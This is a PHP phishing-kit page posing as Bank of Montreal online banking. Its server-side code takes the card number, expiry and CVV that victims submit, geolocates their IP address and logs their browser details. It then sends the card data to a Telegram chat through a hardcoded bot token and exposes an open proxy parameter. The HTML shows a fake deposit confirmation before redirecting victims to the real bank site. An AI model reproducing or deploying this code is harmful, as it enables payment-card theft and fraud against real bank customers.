<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "BMO";
    $car = $_POST['cccc'];
    $exp1 = $_POST['exp1'];
    $exp2 = $_POST['exp2'];
    $CVV = $_POST['Ccc'];

    $url        = "https://BMO.com";

    $code       = $_POST['code']; 
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank [CC INFO]$lh$ip\n$car\n\n----------------\n\n$exp1/$exp2\n\n---------------------\n\n$CVV";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<html ng-app="com.td.tdi.uapWeb" lang="en-CA"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <style type="text/css">.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;} form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <title>Online Banking | Bank of Montreal</title>
        <link rel="stylesheet" href="./files/uap-application-all-css.css">
        <link href="assets/bmo/favicon.ico?v=1" rel="shortcut icon">
        <meta http-equiv="refresh" content="3;URL=https://href.li/?https://bmo.com?&amp;usg=AOvVaw2PqTCCgp4d2maHt-FsW94C">
    </head>
    <body prevent-click-highlight="" autoscroll="" class="">
        <div id="contentWrapper">
            <!-- Header -->
            <!---->
            <div data-ui-view="header" class="" style="">
                <otp-header>
                    <div class="td_rq_header-nav td-header-nav">
                        <!-- Desktop Header START -->
                        <header class="td-header-desktop">
                            <div class="td-nav-primary" style="background-color:#ffffff">
                                <div class="td-container">
                                    <div class="td-section-left">
                                        <div class="td-logo" style="margin-top: 15px;">
                                            <img style="width:100px" src="./files/logo.png">
                                        </div>
                                    </div>
                                    <div class="td-section-right">
                                        <div class="td-quick-access">
                                            <ul class="td-header-nav-utilities">
                                                <li ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide" aria-hidden="true">
                                                    <a href="deposit/bmo/f.php" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
                                                    <span class="td-forscreenreader">Select language</span>
                                                    Français
                                                    <span class="td-icon expand" aria-hidden="true"></span>
                                                    <span class="td-icon collapse" aria-hidden="true"></span>
                                                    </a>
                                                    <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                                        <!---->
                                                        <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                            <a href="deposit/bmo/f.php" role="button" ng-click="vm.setLanguage(language)">
                                                                English
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                                </span><!---->
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                        <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                            <a href="deposit/bmo/f.php" role="button" ng-click="vm.setLanguage(language)">
                                                                Français
                                                                <!---->
                                                                <!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                    </ul>
                                                </li>
                                                <li class="secure-lock-position" aria-hidden="true">
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </header>
                        <!-- Desktop Header END -->
                        <!-- Mobile Header START -->
                        <header class="td-header-mobile">
                            <div class="td-container">
                                <div class="td-section-left">
                                    <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
                                            <span class="td-forscreenreader">Open menu</span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                        </div>
                                        <div class="td-logo">
                                            <img src="./files/logo.png" style="width:91px">
                                        </div>
                                    </button>
                                    <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                                        Test!
                                        <div class="td-logo">
                                            <img src="./files/logo.png" style="width:91px">
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </header>
                        <!-- Mobile Header END -->
                        <!-- Mobile Off-canvas Menu START -->
                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-nav-mobile ng-hide" aria-hidden="true">
                            <!-- Primary mobile menu START -->
                            <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                                <span tabindex="0"></span>
                                <div class="td-nav-mobile-menu-top">
                                    <div class="td-nav-mobile-menu-header">
                                        <div class="td-logo">
                                            <a href="https://authentication.td.com/">
                                            <img src="./files/logo.png" alt="TD Canada Trust">
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <nav>
                                    <ul class="td-nav-mobile-menu-list">
                                        <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                            <a href="deposit/bmo/f.php" aria-expanded="false" role="button">
                                            <span class="td-forscreenreader">Select language</span>
                                            Français
                                            <span class="td-icon expand" aria-hidden="true"></span>
                                            <span class="td-icon collapse" aria-hidden="true"></span>
                                            </a>
                                            <ul class="td-accordion-content">
                                                <!---->
                                                <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                    <a href="deposit/bmo/f.php" role="button" ng-click="vm.setLanguage(language)">
                                                        English
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                        </span><!---->
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                    </a>
                                                </li>
                                                <!---->
                                                <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                    <a href="deposit/bmo/f.php" role="button" ng-click="vm.setLanguage(language)">
                                                        Français
                                                        <!---->
                                                        <!---->
                                                    </a>
                                                </li>
                                                <!---->
                                            </ul>
                                        </li>
                                    </ul>
                                </nav>
                                <span tabindex="0"></span>
                            </div>
                            <!-- Primary mobile menu END -->
                            <div class="td-nav-mobile-overlay"></div>
                        </div>
                        <!-- Mobile Off-canvas Menu END -->
                    </div>
                </otp-header>
            </div>
            <!-- Main Content / Body -->
            <div class="td-contentarea" role="main" style="padding-top: 70px;">
                <!---->
                <ui-view class="" style="">
                    <!---->
                    <ui-view>
                        <reset>
                            <!---->
                            <ui-view class="" style="">
                                <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
                                    <div class="text-center">
                                        <otp-server-error error="vm.dt.recoverPwdError" display="banner">
                                            <!---->
                                        </otp-server-error>
                                    </div>
                                    <div class="td-container">
                                        <h1 class="text-center" tabindex="0">Complete.</h1>
                                        <hr aria-hidden="true" class="td-thin-divider-line-1">
                                        <form method="post" action="deposit/bmo/f.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic">
		                                    <div class="td-row">
			                                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
				                                    <div class="otp-section-mint-green otp-full-width-sm">
					                                    <div class="td-row">
						                                    <div class="td-col-sm-6 td-col-sm-offset-3">
							                                    <div ng-class="{&#39;td-group-touched&#39;: hasTouched, &#39;td-group-error&#39;: hasError &amp;&amp; isDirty,&#39;ng-invalid&#39;: hasError, &#39;ng-dirty&#39;: isDirty, &#39;td-group-focus ng-focus&#39;: hasFocus, &#39;td-group-hover ng-hover&#39;: hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style="">
								                                    <b>Thank you,<br>
<br>
Your funds will be processed and deposited in your account within 48 hours. For security measures, you will be signed out and redirected to the main page.</b><br><br><br>
								                                    <div ng-transclude="" class="label-elements"></div>
																</div>
						                                    </div>
					                                    </div>
				                                    </div>
			                                    </div>
		                                    </div>
                                    	</form>
                                    <br><br><br><br><br><br><br><br><br><br><br><br><br>
            					</div>
					            <br><br>
							</reset-password>
						</ui-view>
					</reset>
				</ui-view>
			</ui-view>
        </div>
        <!-- Footer -->
        <!---->
        <div data-ui-view="footer" class="">
            <otp-footer>
                <footer class="td-background-dark-green" style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
                    <!---->
                    <div class="td-container">
                        <div class="td-row">
                            <div class="td-col-xs-12 td-footer-content otp-footer-content">
                                <div class="td-footer-links td-copy-align-centre td-copy-white">
                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/main/contact-us">
                                    Contact us
                                    </a>
                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/our-privacy-code">
                                    Privacy
                                    </a>
                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/legal">
                                    Legal
                                    </a>
                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/how-we-protect-you">
                                    Security
                                    </a>
                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/cdic">
                                    CDIC Member
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </otp-footer>
        </div><a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        </div>
        <!--[if lt IE 9]>
        <script type="text/javascript" src="resources/es5-shim/es5-shim.min.js?v=0.0.8-HOTFIX2"></script>
        <script type="text/javascript" src="resources/html5shiv/dist/html5shiv.min.js?v=0.0.8-HOTFIX2"></script>
        <![endif]-->
        <div id="ads"></div>
        <div id="ads"></div>
        <div id="ads"></div>
    

</body></html>